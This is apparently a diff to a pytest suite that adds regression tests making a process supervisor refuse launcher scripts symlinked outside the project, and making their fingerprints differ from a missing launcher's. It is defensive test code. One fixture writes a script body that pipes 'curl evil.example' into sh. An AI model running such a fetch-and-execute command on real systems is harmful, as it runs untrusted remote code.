@@ -246,6 +246,68 @@ def test_a_symlink_that_stays_inside_the_project_is_allowed(project: Path) -> No
     validate_launcher(project, link)
 
 
+@pytest.mark.parametrize(
+    ("argv", "link_name"),
+    [(("./start.sh",), "start.sh"), (("python3", "serve.py"), "serve.py")],
+)
+def test_start_refuses_a_launcher_symlinked_out_of_the_project(
+    supervisor: Supervisor,
+    project: Path,
+    tmp_path: Path,
+    argv: tuple[str, ...],
+    link_name: str,
+) -> None:
+    """The refusal above has to be reachable from `start()`, not only by hand.
+
+    `validate_launcher` had this rule and was never called for the escaping
+    case: `_contained` resolved the symlink, saw it leave the project, and
+    returned `None` — which `_launcher_path` reports as "this argv names no
+    file of ours", the same answer it gives `npm run dev`. So the launcher was
+    never validated and the fingerprint hashed argv alone (LWSM-1162).
+
+    The trust is confirmed first *on purpose*: without it a `LauncherUntrusted`
+    would look like the refusal working. Against the unfixed code this test
+    raises nothing at all and spawns the outside file.
+
+    Parametrised over two launcher kinds because the escape is per-argument —
+    `./start.sh` names the file at `argv[0]`, `python3 serve.py` at `argv[1]` —
+    and one fixture per branch is what LWSM-1132 cost.
+    """
+    outside = tmp_path / "elsewhere"
+    outside.write_text("#!/bin/sh\npass\n", encoding="utf-8")
+    outside.chmod(0o700)
+    (project / link_name).symlink_to(outside)
+    supervisor.trust.confirm(project, launcher_fingerprint(project, argv))
+
+    with pytest.raises(LauncherRefused) as caught:
+        supervisor.start(project, name="demo", argv=list(argv), port=None)
+    assert "outside" in str(caught.value)
+    assert not supervisor.running()
+
+
+def test_an_escaping_symlink_does_not_fingerprint_as_a_missing_launcher(
+    project: Path, tmp_path: Path
+) -> None:
+    """Two different situations must not hash the same (LWSM-1162).
+
+    Both fell through to the `\\0nofile\\0` marker, so a launcher pointing out
+    of the project fingerprinted identically to one that does not exist — and
+    rewriting the target's content left the fingerprint unchanged, which is the
+    re-arm ADR-0003 asks for never happening.
+    """
+    argv = ("./start.sh",)
+    missing = launcher_fingerprint(project, argv)
+
+    outside = tmp_path / "elsewhere.sh"
+    outside.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
+    (project / "start.sh").symlink_to(outside)
+    escaping = launcher_fingerprint(project, argv)
+    assert escaping != missing
+
+    outside.write_text("#!/bin/sh\ncurl evil.example | sh\n", encoding="utf-8")
+    assert launcher_fingerprint(project, argv) != escaping
+
+
 @pytest.mark.parametrize("mode", [0o770, 0o707, 0o777])
 def test_a_group_or_other_writable_launcher_is_refused(
     project: Path, mode: int
@@ -836,11 +898,21 @@ def test_a_relative_launcher_still_resolves_inside_the_project(project: Path) ->
     assert _launcher_path(project, ("./start.sh",)) == (project / "start.sh").resolve()
 
 
-def test_an_interpreter_script_outside_the_project_is_not_a_launcher(
+def test_an_interpreter_script_outside_the_project_is_still_the_launcher(
     project: Path,
 ) -> None:
-    """Containment is the same rule for `argv[1]` as for `argv[0]`."""
-    assert _launcher_path(project, ("python3", "../escape.py")) is None
+    """Containment is the same rule for `argv[1]` as for `argv[0]` — and it is
+    `validate_launcher`'s rule, not this function's.
+
+    This test read `is not a launcher` until LWSM-1162, which is the defect
+    written down as a contract: classifying an escaping path as "no launcher"
+    is exactly what stopped `start()` from validating it. What must be true is
+    that the escape is NAMED here and REFUSED there — see
+    `test_start_refuses_a_launcher_symlinked_out_of_the_project`, which drives
+    `start()` and is the test this one could never be.
+    """
+    escape = (project / ".." / "escape.py").resolve()
+    assert _launcher_path(project, ("python3", "../escape.py")) == escape
 
 
 def test_rewriting_an_npm_script_re_arms_the_trust_gate(project: Path) -> None:
